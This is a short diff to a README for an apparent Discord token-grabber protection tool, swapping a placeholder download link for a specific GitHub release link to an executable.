@@ -4,7 +4,7 @@ An all-in-one security tool that proactively protects you from Discord token gra
 
 ## 📥 Download
 
-**[📥 Click here to Download the latest version](https://github.com/yourusername/yourrepo/releases/latest/download/TokenProtector.exe)**
+**[📥 Click here to Download the latest version](https://github.com/sn9x0/AntiDiscordTokenGrabber/releases/download/AntiGrabber/TokenProtector.exe)**
 *(Note: Replace the link above with your actual download link)*
 
 ---
